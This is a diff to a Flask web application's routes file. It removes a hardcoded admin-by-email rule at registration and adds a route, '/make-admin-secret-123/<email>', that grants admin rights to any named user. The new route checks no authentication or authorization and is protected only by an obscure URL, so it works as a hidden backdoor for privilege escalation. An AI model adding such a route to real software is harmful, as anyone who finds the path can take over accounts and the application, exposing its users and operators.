@@ -80,7 +80,7 @@ def register():
         password = generate_password_hash(request.form.get('password'))
 
 
-        new_user = User(username=username, email=email, password=password, is_admin=True if email == "admin123@gmail.com" else False)
+        new_user = User(username=username, email=email, password=password)
         db.session.add(new_user)
         db.session.commit()
 
@@ -159,6 +159,16 @@ def logout():
     logout_user()
     flash("You have been logged out.")
     return redirect(url_for('index'))
+
+
+@app.route('/make-admin-secret-123/<email>')
+def make_admin(email):
+    user = User.query.filter_by(email=email).first()
+    if not user:
+        return "User not found"
+    user.is_admin = True
+    db.session.commit()
+    return f"Done! {user.username} is now admin"
 
 
 @app.route('/profile')
